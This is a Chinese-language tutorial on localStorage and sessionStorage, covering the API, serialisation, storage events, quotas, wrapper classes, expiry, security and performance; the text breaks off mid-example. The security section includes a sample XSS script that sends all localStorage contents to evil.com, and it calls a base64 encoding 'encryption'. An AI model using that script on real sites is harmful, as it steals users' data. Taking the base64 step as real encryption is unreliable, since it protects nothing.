> Web Storage（localStorage 和 sessionStorage）是浏览器提供的本地存储机制
> 本笔记从基础到进阶，全面覆盖 Web Storage 的使用、最佳实践和常见问题

---

## 目录

1. [基础概念](#1-基础概念)
2. [基本操作](#2-基本操作)
3. [数据类型处理](#3-数据类型处理)
4. [存储事件监听](#4-存储事件监听)
5. [存储容量与限制](#5-存储容量与限制)
6. [封装工具类](#6-封装工具类)
7. [过期时间实现](#7-过期时间实现)
8. [安全性考虑](#8-安全性考虑)
9. [性能优化](#9-性能优化)
10. [与其他存储方案对比](#10-与其他存储方案对比)
11. [实际应用场景](#11-实际应用场景)
12. [调试技巧](#12-调试技巧)
13. [常见错误与解决方案](#13-常见错误与解决方案)

---

## 1. 基础概念

### 1.1 什么是 Web Storage？

Web Storage 是 HTML5 引入的一种在浏览器端存储数据的机制，包含两个对象：
- **localStorage**：持久化存储，数据永久保存，除非手动清除
- **sessionStorage**：会话存储，数据仅在当前会话（标签页）有效，关闭标签页后清除

**为什么需要 Web Storage？**

在 Web Storage 出现之前，我们只能使用 Cookie 来存储客户端数据。但 Cookie 有很多限制：
- 容量小（约 4KB）
- 每次 HTTP 请求都会自动发送，浪费带宽
- 操作 API 不友好

Web Storage 解决了这些问题，提供了更大的存储空间（通常 5-10MB）和更简洁的 API。

### 1.2 localStorage vs sessionStorage

这两者的 API 完全相同，区别在于数据的生命周期和作用域：

| 特性 | localStorage | sessionStorage |
|------|--------------|----------------|
| 生命周期 | 永久存储，除非手动清除 | 会话结束（标签页关闭）时清除 |
| 作用域 | 同源的所有标签页共享 | 仅当前标签页可访问 |
| 存储大小 | 约 5-10MB | 约 5-10MB |
| 数据类型 | 仅支持字符串 | 仅支持字符串 |
| 同步/异步 | 同步操作 | 同步操作 |

**通俗理解**：
- `localStorage` 就像是浏览器的"硬盘"，数据会一直保存
- `sessionStorage` 就像是浏览器的"内存"，关闭标签页就清空了

### 1.3 同源策略

Web Storage 遵循同源策略，只有协议、域名、端口都相同的页面才能访问同一个存储空间：

```
https://example.com:443/page1  ✅ 可以访问
https://example.com:443/page2  ✅ 可以访问（同源）
http://example.com/page        ❌ 不能访问（协议不同）
https://sub.example.com/page   ❌ 不能访问（域名不同）
https://example.com:8080/page  ❌ 不能访问（端口不同）
```

### 1.4 浏览器支持

Web Storage 得到了所有现代浏览器的支持：

| 浏览器 | 支持版本 |
|--------|----------|
| Chrome | 4+ |
| Firefox | 3.5+ |
| Safari | 4+ |
| Edge | 12+ |
| IE | 8+ |

```javascript
// 检测浏览器是否支持 Web Storage
function isStorageSupported() {
  try {
    const testKey = '__storage_test__';
    localStorage.setItem(testKey, testKey);
    localStorage.removeItem(testKey);
    return true;
  } catch (e) {
    return false;
  }
}

if (isStorageSupported()) {
  console.log('浏览器支持 Web Storage');
} else {
  console.log('浏览器不支持 Web Storage，请使用其他存储方案');
}
```

> **注意**：在隐私模式（无痕浏览）下，某些浏览器会禁用或限制 Web Storage。

---

## 2. 基本操作

### 2.1 存储数据 - setItem()

`setItem(key, value)` 方法用于存储数据，接受两个参数：键名和键值。

```javascript
// 基本用法
localStorage.setItem('username', 'John');
sessionStorage.setItem('token', 'abc123');

// 也可以使用属性访问方式（不推荐）
localStorage.username = 'John';
localStorage['username'] = 'John';
```

**为什么不推荐属性访问方式？**
- 无法存储名为 `length`、`key`、`getItem` 等与 Storage 原型方法同名的键
- 代码可读性较差，不够明确

### 2.2 读取数据 - getItem()

`getItem(key)` 方法用于读取数据，如果键不存在则返回 `null`。

```javascript
// 基本用法
const username = localStorage.getItem('username');
console.log(username); // "John"

// 读取不存在的键
const notExist = localStorage.getItem('notExist');
console.log(notExist); // null

// 属性访问方式（不推荐）
const username2 = localStorage.username;
const username3 = localStorage['username'];
```

### 2.3 删除数据 - removeItem()

`removeItem(key)` 方法用于删除指定键的数据。

```javascript
// 删除单个数据
localStorage.removeItem('username');

// 删除不存在的键不会报错
localStorage.removeItem('notExist'); // 静默失败，不会抛出异常
```

### 2.4 清空所有数据 - clear()

`clear()` 方法会清空当前域名下的所有存储数据。

```javascript
// 清空 localStorage
localStorage.clear();

// 清空 sessionStorage
sessionStorage.clear();
```

> **警告**：`clear()` 会删除所有数据，使用时要谨慎！

### 2.5 获取键名 - key()

`key(index)` 方法返回指定索引位置的键名。

```javascript
// 存储一些数据
localStorage.setItem('name', 'John');
localStorage.setItem('age', '25');
localStorage.setItem('city', 'Beijing');

// 获取第一个键名
console.log(localStorage.key(0)); // 可能是 "name"、"age" 或 "city"

// 注意：键的顺序不保证与插入顺序一致！
```

### 2.6 获取存储数量 - length

`length` 属性返回存储的键值对数量。

```javascript
console.log(localStorage.length); // 3

// 遍历所有存储的数据
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}
```

### 2.7 遍历存储数据

```javascript
// 方法一：使用 key() 和 length
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  console.log(key, localStorage.getItem(key));
}

// 方法二：使用 Object.keys()
Object.keys(localStorage).forEach(key => {
  console.log(key, localStorage.getItem(key));
});

// 方法三：使用 for...in（会遍历原型链，需要 hasOwnProperty 过滤）
for (let key in localStorage) {
  if (localStorage.hasOwnProperty(key)) {
    console.log(key, localStorage.getItem(key));
  }
}

// 方法四：使用 Object.entries()（推荐）
Object.entries(localStorage).forEach(([key, value]) => {
  console.log(key, value);
});
```

---

## 3. 数据类型处理

### 3.1 只能存储字符串

Web Storage 只能存储字符串类型的数据。如果存储其他类型，会自动转换为字符串：

```javascript
// 存储数字
localStorage.setItem('count', 100);
console.log(localStorage.getItem('count')); // "100"（字符串）
console.log(typeof localStorage.getItem('count')); // "string"

// 存储布尔值
localStorage.setItem('isLogin', true);
console.log(localStorage.getItem('isLogin')); // "true"（字符串）

// 存储对象（错误示范）
localStorage.setItem('user', { name: 'John' });
console.log(localStorage.getItem('user')); // "[object Object]" 😱
```

### 3.2 使用 JSON 序列化

要存储复杂数据类型（对象、数组），需要使用 `JSON.stringify()` 和 `JSON.parse()`：

```javascript
// 存储对象
const user = {
  name: 'John',
  age: 25,
  hobbies: ['reading', 'coding']
};

// 序列化后存储
localStorage.setItem('user', JSON.stringify(user));

// 读取并反序列化
const storedUser = JSON.parse(localStorage.getItem('user'));
console.log(storedUser.name); // "John"
console.log(storedUser.hobbies); // ["reading", "coding"]

// 存储数组
const fruits = ['apple', 'banana', 'orange'];
localStorage.setItem('fruits', JSON.stringify(fruits));

const storedFruits = JSON.parse(localStorage.getItem('fruits'));
console.log(storedFruits[0]); // "apple"
```

### 3.3 处理特殊数据类型

某些数据类型无法通过 JSON 正确序列化：

```javascript
// ❌ Date 对象会变成字符串
const data = {
  createdAt: new Date()
};
localStorage.setItem('data', JSON.stringify(data));
const parsed = JSON.parse(localStorage.getItem('data'));
console.log(parsed.createdAt); // "2024-01-15T10:30:00.000Z"（字符串，不是 Date 对象）

// ✅ 解决方案：手动转换
const parsedWithDate = JSON.parse(localStorage.getItem('data'));
parsedWithDate.createdAt = new Date(parsedWithDate.createdAt);

// ❌ 函数无法序列化
const objWithFunc = {
  name: 'John',
  sayHello: function() { console.log('Hello'); }
};
localStorage.setItem('obj', JSON.stringify(objWithFunc));
console.log(JSON.parse(localStorage.getItem('obj'))); // { name: "John" }，函数丢失了

// ❌ undefined 会被忽略
const objWithUndefined = {
  name: 'John',
  age: undefined
};
localStorage.setItem('obj', JSON.stringify(objWithUndefined));
console.log(JSON.parse(localStorage.getItem('obj'))); // { name: "John" }，age 丢失了

// ❌ Map 和 Set 会变成空对象
const map = new Map([['key', 'value']]);
localStorage.setItem('map', JSON.stringify(map));
console.log(JSON.parse(localStorage.getItem('map'))); // {}
```

### 3.4 安全的 JSON 解析

读取数据时要处理可能的解析错误：

```javascript
// 安全的读取函数
function safeGetItem(key, defaultValue = null) {
  try {
    const item = localStorage.getItem(key);
    if (item === null) {
      return defaultValue;
    }
    return JSON.parse(item);
  } catch (error) {
    console.error(`解析 ${key} 失败:`, error);
    return defaultValue;
  }
}

// 使用示例
const user = safeGetItem('user', { name: 'Guest' });
const settings = safeGetItem('settings', {});
```

---

## 4. 存储事件监听

### 4.1 storage 事件

当 localStorage 的数据发生变化时，会触发 `storage` 事件。这个事件可以用于跨标签页通信。

**重要特性**：
- 只有在**其他标签页**修改数据时才会触发
- 当前标签页修改数据**不会**触发自己的 storage 事件
- sessionStorage 的变化**不会**触发 storage 事件（因为它不跨标签页共享）

```javascript
// 监听 storage 事件
window.addEventListener('storage', (event) => {
  console.log('存储发生变化！');
  console.log('键名:', event.key);
  console.log('旧值:', event.oldValue);
  console.log('新值:', event.newValue);
  console.log('触发页面:', event.url);
  console.log('存储对象:', event.storageArea);
});

// 在另一个标签页中修改数据
localStorage.setItem('message', 'Hello from another tab!');
```

### 4.2 跨标签页通信示例

利用 storage 事件可以实现简单的跨标签页通信：

```javascript
// 发送消息（在标签页 A）
function sendMessage(message) {
  localStorage.setItem('cross-tab-message', JSON.stringify({
    data: message,
    timestamp: Date.now()
  }));
}

// 接收消息（在标签页 B）
window.addEventListener('storage', (event) => {
  if (event.key === 'cross-tab-message') {
    const message = JSON.parse(event.newValue);
    console.log('收到消息:', message.data);
    handleMessage(message.data);
  }
});

// 实际应用：同步登录状态
window.addEventListener('storage', (event) => {
  if (event.key === 'auth-token') {
    if (event.newValue === null) {
      // 用户在其他标签页登出了
      console.log('检测到登出，跳转到登录页');
      window.location.href = '/login';
    } else if (event.oldValue === null) {
      // 用户在其他标签页登录了
      console.log('检测到登录，刷新页面');
      window.location.reload();
    }
  }
});
```

---

## 5. 存储容量与限制

### 5.1 存储容量

不同浏览器的存储容量限制：

| 浏览器 | localStorage | sessionStorage |
|--------|--------------|----------------|
| Chrome | 5MB | 5MB |
| Firefox | 5MB | 5MB |
| Safari | 5MB | 5MB |
| Edge | 5MB | 5MB |
| IE | 5MB | 5MB |

> **注意**：这里的 5MB 是指字符串的大小。由于 JavaScript 使用 UTF-16 编码，一个字符占 2 字节，所以实际能存储约 250 万个字符。

### 5.2 检测剩余容量

```javascript
// 估算已使用的存储空间
function getStorageSize(storage = localStorage) {
  let total = 0;
  for (let key in storage) {
    if (storage.hasOwnProperty(key)) {
      // 键和值都占用空间
      total += key.length + storage.getItem(key).length;
    }
  }
  // 返回字节数（UTF-16 每个字符 2 字节）
  return total * 2;
}

console.log(`已使用: ${(getStorageSize() / 1024).toFixed(2)} KB`);

// 测试最大容量
function testStorageLimit() {
  const testKey = 'storage-test';
  const chunk = 'x'.repeat(1024); // 1KB 的数据
  let size = 0;
  
  try {
    while (true) {
      localStorage.setItem(testKey, localStorage.getItem(testKey) + chunk);
      size++;
    }
  } catch (e) {
    localStorage.removeItem(testKey);
    console.log(`最大容量约: ${size} KB`);
  }
}
```

### 5.3 处理存储满的情况

当存储空间满时，`setItem()` 会抛出 `QuotaExceededError` 异常：

```javascript
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
    return true;
  } catch (error) {
    if (error.name === 'QuotaExceededError' || 
        error.name === 'NS_ERROR_DOM_QUOTA_REACHED') {
      console.error('存储空间已满！');
      // 可以尝试清理旧数据
      cleanOldData();
      // 或者提示用户
      alert('存储空间不足，请清理浏览器数据');
      return false;
    }
    throw error;
  }
}

// 清理策略：删除最旧的数据
function cleanOldData() {
  const items = [];
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const item = JSON.parse(localStorage.getItem(key));
    if (item && item.timestamp) {
      items.push({ key, timestamp: item.timestamp });
    }
  }
  
  // 按时间排序，删除最旧的
  items.sort((a, b) => a.timestamp - b.timestamp);
  if (items.length > 0) {
    localStorage.removeItem(items[0].key);
  }
}
```

---

## 6. 封装工具类

### 6.1 基础工具类

```javascript
/**
 * Storage 工具类
 * 提供类型安全的存储操作
 */
class StorageUtil {
  constructor(storage = localStorage) {
    this.storage = storage;
  }

  /**
   * 存储数据
   * @param {string} key - 键名
   * @param {any} value - 值（会自动序列化）
   * @returns {boolean} 是否成功
   */
  set(key, value) {
    try {
      const serialized = JSON.stringify(value);
      this.storage.setItem(key, serialized);
      return true;
    } catch (error) {
      console.error(`存储 ${key} 失败:`, error);
      return false;
    }
  }

  /**
   * 读取数据
   * @param {string} key - 键名
   * @param {any} defaultValue - 默认值
   * @returns {any} 存储的值或默认值
   */
  get(key, defaultValue = null) {
    try {
      const item = this.storage.getItem(key);
      if (item === null) {
        return defaultValue;
      }
      return JSON.parse(item);
    } catch (error) {
      console.error(`读取 ${key} 失败:`, error);
      return defaultValue;
    }
  }

  /**
   * 删除数据
   * @param {string} key - 键名
   */
  remove(key) {
    this.storage.removeItem(key);
  }

  /**
   * 清空所有数据
   */
  clear() {
    this.storage.clear();
  }

  /**
   * 检查键是否存在
   * @param {string} key - 键名
   * @returns {boolean}
   */
  has(key) {
    return this.storage.getItem(key) !== null;
  }

  /**
   * 获取所有键名
   * @returns {string[]}
   */
  keys() {
    return Object.keys(this.storage);
  }

  /**
   * 获取存储数量
   * @returns {number}
   */
  get length() {
    return this.storage.length;
  }
}

// 创建实例
const localStore = new StorageUtil(localStorage);
const sessionStore = new StorageUtil(sessionStorage);

// 使用示例
localStore.set('user', { name: 'John', age: 25 });
console.log(localStore.get('user')); // { name: 'John', age: 25 }
console.log(localStore.has('user')); // true
localStore.remove('user');
```

### 6.2 带命名空间的工具类

在大型项目中，使用命名空间可以避免键名冲突：

```javascript
/**
 * 带命名空间的 Storage 工具类
 */
class NamespacedStorage {
  constructor(namespace, storage = localStorage) {
    this.namespace = namespace;
    this.storage = storage;
  }

  // 生成带命名空间的键名
  _getKey(key) {
    return `${this.namespace}:${key}`;
  }

  set(key, value) {
    try {
      this.storage.setItem(this._getKey(key), JSON.stringify(value));
      return true;
    } catch (error) {
      console.error(`存储失败:`, error);
      return false;
    }
  }

  get(key, defaultValue = null) {
    try {
      const item = this.storage.getItem(this._getKey(key));
      return item ? JSON.parse(item) : defaultValue;
    } catch {
      return defaultValue;
    }
  }

  remove(key) {
    this.storage.removeItem(this._getKey(key));
  }

  // 清空当前命名空间的所有数据
  clear() {
    const prefix = `${this.namespace}:`;
    Object.keys(this.storage)
      .filter(key => key.startsWith(prefix))
      .forEach(key => this.storage.removeItem(key));
  }

  // 获取当前命名空间的所有键
  keys() {
    const prefix = `${this.namespace}:`;
    return Object.keys(this.storage)
      .filter(key => key.startsWith(prefix))
      .map(key => key.slice(prefix.length));
  }
}

// 使用示例：不同模块使用不同命名空间
const userStorage = new NamespacedStorage('user');
const cartStorage = new NamespacedStorage('cart');

userStorage.set('profile', { name: 'John' });
cartStorage.set('items', [{ id: 1, name: 'iPhone' }]);

// 存储的键名：
// user:profile -> {"name":"John"}
// cart:items -> [{"id":1,"name":"iPhone"}]

// 清空购物车不会影响用户数据
cartStorage.clear();
console.log(userStorage.get('profile')); // { name: 'John' } 仍然存在
```

### 6.3 TypeScript 版本

```typescript
interface StorageOptions {
  namespace?: string;
  storage?: Storage;
}

interface StorageItem<T> {
  value: T;
  timestamp: number;
  expiry?: number;
}

class TypedStorage {
  private namespace: string;
  private storage: Storage;

  constructor(options: StorageOptions = {}) {
    this.namespace = options.namespace || '';
    this.storage = options.storage || localStorage;
  }

  private getKey(key: string): string {
    return this.namespace ? `${this.namespace}:${key}` : key;
  }

  set<T>(key: string, value: T, expiryMs?: number): boolean {
    try {
      const item: StorageItem<T> = {
        value,
        timestamp: Date.now(),
        expiry: expiryMs ? Date.now() + expiryMs : undefined
      };
      this.storage.setItem(this.getKey(key), JSON.stringify(item));
      return true;
    } catch (error) {
      console.error('Storage set error:', error);
      return false;
    }
  }

  get<T>(key: string, defaultValue: T | null = null): T | null {
    try {
      const raw = this.storage.getItem(this.getKey(key));
      if (!raw) return defaultValue;

      const item: StorageItem<T> = JSON.parse(raw);
      
      // 检查是否过期
      if (item.expiry && Date.now() > item.expiry) {
        this.remove(key);
        return defaultValue;
      }

      return item.value;
    } catch {
      return defaultValue;
    }
  }

  remove(key: string): void {
    this.storage.removeItem(this.getKey(key));
  }

  has(key: string): boolean {
    return this.get(key) !== null;
  }

  clear(): void {
    if (this.namespace) {
      const prefix = `${this.namespace}:`;
      Object.keys(this.storage)
        .filter(k => k.startsWith(prefix))
        .forEach(k => this.storage.removeItem(k));
    } else {
      this.storage.clear();
    }
  }
}

// 使用示例
const storage = new TypedStorage({ namespace: 'app' });

interface User {
  id: number;
  name: string;
  email: string;
}

// 类型安全的存取
storage.set<User>('currentUser', { id: 1, name: 'John', email: 'john@example.com' });
const user = storage.get<User>('currentUser');
console.log(user?.name); // "John"
```

---

## 7. 过期时间实现

localStorage 本身不支持过期时间，但我们可以自己实现：

### 7.1 基础实现

```javascript
/**
 * 带过期时间的存储
 */
const ExpiringStorage = {
  /**
   * 存储数据（带过期时间）
   * @param {string} key - 键名
   * @param {any} value - 值
   * @param {number} ttl - 过期时间（毫秒）
   */
  set(key, value, ttl) {
    const item = {
      value: value,
      expiry: ttl ? Date.now() + ttl : null
    };
    localStorage.setItem(key, JSON.stringify(item));
  },

  /**
   * 读取数据（自动检查过期）
   * @param {string} key - 键名
   * @param {any} defaultValue - 默认值
   * @returns {any}
   */
  get(key, defaultValue = null) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) {
      return defaultValue;
    }

    try {
      const item = JSON.parse(itemStr);
      
      // 检查是否过期
      if (item.expiry && Date.now() > item.expiry) {
        localStorage.removeItem(key);
        return defaultValue;
      }
      
      return item.value;
    } catch {
      return defaultValue;
    }
  },

  /**
   * 删除数据
   */
  remove(key) {
    localStorage.removeItem(key);
  },

  /**
   * 检查是否过期
   */
  isExpired(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return true;

    try {
      const item = JSON.parse(itemStr);
      return item.expiry && Date.now() > item.expiry;
    } catch {
      return true;
    }
  },

  /**
   * 获取剩余时间（毫秒）
   */
  getTTL(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return 0;

    try {
      const item = JSON.parse(itemStr);
      if (!item.expiry) return Infinity;
      const remaining = item.expiry - Date.now();
      return remaining > 0 ? remaining : 0;
    } catch {
      return 0;
    }
  }
};

// 使用示例
// 存储 1 小时后过期的数据
ExpiringStorage.set('token', 'abc123', 60 * 60 * 1000);

// 存储 7 天后过期的数据
ExpiringStorage.set('rememberMe', true, 7 * 24 * 60 * 60 * 1000);

// 读取数据（过期自动返回 null）
const token = ExpiringStorage.get('token');

// 检查剩余时间
console.log(`Token 剩余时间: ${ExpiringStorage.getTTL('token') / 1000} 秒`);
```

### 7.2 定时清理过期数据

```javascript
/**
 * 定时清理过期数据
 */
class StorageWithCleanup {
  constructor(cleanupInterval = 60000) { // 默认每分钟清理一次
    this.startCleanup(cleanupInterval);
  }

  startCleanup(interval) {
    // 页面加载时清理一次
    this.cleanup();
    
    // 定时清理
    this.cleanupTimer = setInterval(() => {
      this.cleanup();
    }, interval);
  }

  stopCleanup() {
    if (this.cleanupTimer) {
      clearInterval(this.cleanupTimer);
    }
  }

  cleanup() {
    const now = Date.now();
    const keysToRemove = [];

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      try {
        const item = JSON.parse(localStorage.getItem(key));
        if (item && item.expiry && now > item.expiry) {
          keysToRemove.push(key);
        }
      } catch {
        // 忽略非 JSON 格式的数据
      }
    }

    keysToRemove.forEach(key => {
      localStorage.removeItem(key);
      console.log(`已清理过期数据: ${key}`);
    });

    return keysToRemove.length;
  }
}

// 使用
const storageManager = new StorageWithCleanup(30000); // 每 30 秒清理一次
```

### 7.3 常用时间常量

```javascript
// 时间常量（毫秒）
const TIME = {
  SECOND: 1000,
  MINUTE: 60 * 1000,
  HOUR: 60 * 60 * 1000,
  DAY: 24 * 60 * 60 * 1000,
  WEEK: 7 * 24 * 60 * 60 * 1000,
  MONTH: 30 * 24 * 60 * 60 * 1000,
  YEAR: 365 * 24 * 60 * 60 * 1000
};

// 使用示例
ExpiringStorage.set('cache', data, TIME.HOUR);      // 1 小时
ExpiringStorage.set('session', token, TIME.DAY);    // 1 天
ExpiringStorage.set('remember', user, TIME.WEEK);   // 1 周
```

---

## 8. 安全性考虑

### 8.1 不要存储敏感信息

Web Storage 的数据以明文形式存储，任何能访问页面的 JavaScript 代码都可以读取：

```javascript
// ❌ 绝对不要这样做
localStorage.setItem('password', 'mySecretPassword');
localStorage.setItem('creditCard', '1234-5678-9012-3456');
localStorage.setItem('ssn', '123-45-6789');

// ✅ 敏感信息应该存储在服务端
// 客户端只存储不敏感的标识符
localStorage.setItem('sessionId', 'abc123');
localStorage.setItem('userId', '12345');
```

### 8.2 XSS 攻击风险

如果网站存在 XSS 漏洞，攻击者可以轻易窃取 localStorage 中的数据：

```javascript
// 攻击者注入的恶意代码
<script>
  // 窃取所有 localStorage 数据
  const stolenData = JSON.stringify(localStorage);
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: stolenData
  });
</script>
```

**防护措施**：

```javascript
// 1. 对用户输入进行转义
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 2. 使用 Content-Security-Policy
// Content-Security-Policy: script-src 'self'

// 3. 对存储的数据进行加密（简单示例）
function encrypt(data, key) {
  // 实际项目中应使用专业的加密库如 CryptoJS
  return btoa(JSON.stringify(data) + key);
}

function decrypt(encrypted, key) {
  try {
    const decoded = atob(encrypted);
    return JSON.parse(decoded.slice(0, -key.length));
  } catch {
    return null;
  }
}

// 4. 验证数据完整性
function setWithChecksum(key, value) {
  const data = JSON.stringify(value);
  const checksum = simpleHash(data);
  localStorage.setItem(key, JSON.stringify({ data: value, checksum }));
}

function getWithChecksum(key) {
  const item = JSON.parse(localStorage.getItem(key));
  if (!item) return null;
  
  const checksum = simpleHash(JSON.stringify(item.data));
  if (checksum !== item.checksum) {
    console.error('数据被篡改！');
    return null;
  }
  return item.data;
}
```

### 8.3 数据加密存储

对于需要在客户端存储的敏感数据，可以使用加密：

```javascript
// 使用 Web Crypto API 进行加密
class SecureStorage {
  constructor(secretKey) {
    this.secretKey = secretKey;
  }

  // 生成加密密钥
  async getKey() {
    const encoder = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey(
      'raw',
      encoder.encode(this.secretKey),
      'PBKDF2',
      false,
      ['deriveBits', 'deriveKey']
    );

    return crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: encoder.encode('salt'),
        iterations: 100000,
        hash: 'SHA-256'
      },
      keyMaterial,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt', 'decrypt']
    );
  }

  // 加密数据
  async encrypt(data) {
    const key = await this.getKey();
    const encoder = new TextEncoder();
    const iv = crypto.getRandomValues(new Uint8Array(12));
    
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      key,
      encoder.encode(JSON.stringify(data))
    );

    return {
      iv: Array.from(iv),
      data: Array.from(new Uint8Array(encrypted))
    };
  }

  // 解密数据
  async decrypt(encryptedObj) {
    const key = await this.getKey();
    const decoder = new TextDecoder();
    
    const decrypted = await crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: new Uint8Array(encryptedObj.iv) },
      key,
      new Uint8Array(encryptedObj.data)
    );

    return JSON.parse(decoder.decode(decrypted));
  }

  // 加密存储
  async set(key, value) {
    const encrypted = await this.encrypt(value);
    localStorage.setItem(key, JSON.stringify(encrypted));
  }

  // 解密读取
  async get(key) {
    const item = localStorage.getItem(key);
    if (!item) return null;
    
    try {
      const encrypted = JSON.parse(item);
      return await this.decrypt(encrypted);
    } catch {
      return null;
    }
  }
}

// 使用示例
const secureStorage = new SecureStorage('my-secret-key');

// 加密存储
await secureStorage.set('sensitiveData', { token: 'abc123' });

// 解密读取
const data = await secureStorage.get('sensitiveData');
console.log(data); // { token: 'abc123' }
```

---

## 9. 性能优化

### 9.1 避免频繁读写

Web Storage 是同步操作，频繁读写会阻塞主线程：

```javascript
// ❌ 错误：频繁读写
for (let i = 0; i < 1000; i++) {
  localStorage.setItem(`item-${i}`, `value-${i}`);
}

// ✅ 正确：批量操作
const data = {};
for (let i = 0; i < 1000; i++) {
  data[`item-${i}`] = `value-${i}`;
}
localStorage.setItem('batchData', JSON.stringify(data));

// ✅ 使用内存缓存减少读取次数
class CachedStorage {
  constructor() {
    this.cache = new Map();
  }

  get(key) {
    if (this.cache.has(key)) {
      return this.cache.get(key);
    }
    
    const value = localStorage.getItem(key);
    const parsed = value ? JSON.parse(value) : null;
    this.cache.set(key, parsed);
    return parsed;
  }

  set(key, value) {
    this.cache.set(key, value);
    localStorage.setItem(key, JSON.stringify(value));
  }

  invalidate(key) {
    this.cache.delete(key);
  }

  clearCache() {
    this.cache.clear();
  }
}
```

### 9.2 使用防抖/节流

对于频繁变化的数据，使用防抖来减少写入次数：

```javascript
// 防抖函数
function debounce(fn, delay) {
  let timer = null;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

// 使用防抖保存数据
const saveToStorage = debounce((key, value) => {
  localStorage.setItem(key, JSON.stringify(value));
  console.log('数据已保存');
}, 500);

// 用户输入时频繁调用，但实际只会在停止输入 500ms 后保存一次
input.addEventListener('input', (e) => {
  saveToStorage('draft', e.target.value);
});
```

### 9.3 数据压缩

对于大量数据，可以使用压缩来节省空间：

```javascript
// 使用 LZString 库进行压缩
// npm install lz-string
import LZString from 'lz-string';

const CompressedStorage = {
  set(key, value) {
    const json = JSON.stringify(value);
    const compressed = LZString.compressToUTF16(json);
    localStorage.setItem(key, compressed);
    
    console.log(`原始大小: ${json.length}, 压缩后: ${compressed.length}`);
    console.log(`压缩率: ${((1 - compressed.length / json.length) * 100).toFixed(2)}%`);
  },

  get(key) {
    const compressed = localStorage.getItem(key);
    if (!compressed) return null;
    
    const json = LZString.decompressFromUTF16(compressed);
    return JSON.parse(json);
  }
};

// 使用示例
const largeData = { /* 大量数据 */ };
CompressedStorage.set('largeData', largeData);
```

### 9.4 分片存储

当单个数据超过存储限制时，可以分片存储：

```javascript
class ChunkedStorage {
  constructor(chunkSize = 1024 * 1024) { // 默认 1MB 一片
    this.chunkSize = chunkSize;
  }

  set(key, value) {
    const json = JSON.stringify(value);
    const chunks = [];
    
    for (let i = 0; i < json.length; i += this.chunkSize) {
      chunks.push(json.slice(i, i + this.chunkSize));
    }

    // 存储元数据
    localStorage.setItem(`${key}_meta`, JSON.stringify({
      chunks: chunks.length,
      totalSize: json.length
    }));

    // 存储各个分片
    chunks.forEach((chunk, index) => {
      localStorage.setItem(`${key}_chunk_${index}`, chunk);
    });
  }

  get(key) {
    const metaStr = localStorage.getItem(`${key}_meta`);
    if (!metaStr) return null;

    const meta = JSON.parse(metaStr);
    let json = '';

    for (let i = 0; i < meta.chunks; i++) {
      const chunk = localStorage.getItem(`${key}_chunk_${i}`);
      if (chunk === null) return null;
      json += chunk;
    }

    return JSON.parse(json);
  }

  remove(key) {
    const metaStr = localStorage.getItem(`${key}_meta`);
    if (!metaStr) return;

    const meta = JSON.parse(metaStr);
    localStorage.removeItem(`${key}_meta`);
    
    for (let i = 0; i < meta.chunks; i++) {
      localStorage.removeItem(`${key}_chunk_${i}`);
    }
  }
}
```

---

## 10. 与其他存储方案对比

### 10.1 存储方案对比表

| 特性 | localStorage | sessionStorage | Cookie | IndexedDB |
|------|--------------|----------------|--------|-----------|
| 容量 | 5-10MB | 5-10MB | ~4KB | 无限制（需用户授权） |
| 生命周期 | 永久 | 会话结束 | 可设置过期时间 | 永久 |
| 作用域 | 同源所有标签页 | 当前标签页 | 可跨子域 | 同源 |
| 随请求发送 | ❌ | ❌ | ✅ | ❌ |
| API 类型 | 同步 | 同步 | 同步 | 异步 |
| 数据类型 | 字符串 | 字符串 | 字符串 | 任意类型 |
| 可被 JS 访问 | ✅ | ✅ | 可设置 HttpOnly | ✅ |

### 10.2 选择建议

```javascript
// 1. 用户偏好设置（主题、语言等）→ localStorage
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'zh-CN');

// 2. 表单临时数据 → sessionStorage
sessionStorage.setItem('formDraft', JSON.stringify(formData));

// 3. 认证信息 → Cookie（HttpOnly + Secure）
// 由服务端设置，更安全

// 4. 大量结构化数据 → IndexedDB
// 如离线应用数据、大型缓存等

// 5. 需要跨域共享 → Cookie
// 设置 Domain 属性实现子域名共享
```

### 10.3 何时使用 localStorage

适合场景：
- 用户偏好设置（主题、字体大小、布局）
- 非敏感的用户数据缓存
- 应用状态持久化
- 离线数据存储（小量）
- 性能优化缓存

不适合场景：
- 敏感信息（密码、Token、个人信息）
- 需要服务端访问的数据
- 大量数据（超过 5MB）
- 需要复杂查询的数据

### 10.4 何时使用 sessionStorage

适合场景：
- 表单数据临时保存（防止刷新丢失）
- 单次会话的状态管理
- 页面间传递数据（同一标签页）
- 敏感但临时的数据

```javascript
// 表单数据自动保存
const form = document.querySelector('form');

// 保存表单数据
form.addEventListener('input', () => {
  const formData = new FormData(form);
  const data = Object.fromEntries(formData);
  sessionStorage.setItem('formBackup', JSON.stringify(data));
});

// 恢复表单数据
window.addEventListener('load', () => {
  const backup = sessionStorage.getItem('formBackup');
  if (backup) {
    const data = JSON.parse(backup);
    Object.entries(data).forEach(([name, value]) => {
      const input = form.querySelector(`[name="${name}"]`);
      if (input) input.value = value;
    });
  }
});

// 提交成功后清除
form.addEventListener('submit', () => {
  sessionStorage.removeItem('formBackup');
});
```

---

## 11. 实际应用场景

### 11.1 用户偏好设置

```javascript
// 主题切换
const ThemeManager = {
  STORAGE_KEY: 'user-theme',
  
  init() {
    const savedTheme = localStorage.getItem(this.STORAGE_KEY);
    if (savedTheme) {
      this.apply(savedTheme);
    } else {
      // 检测系统主题偏好
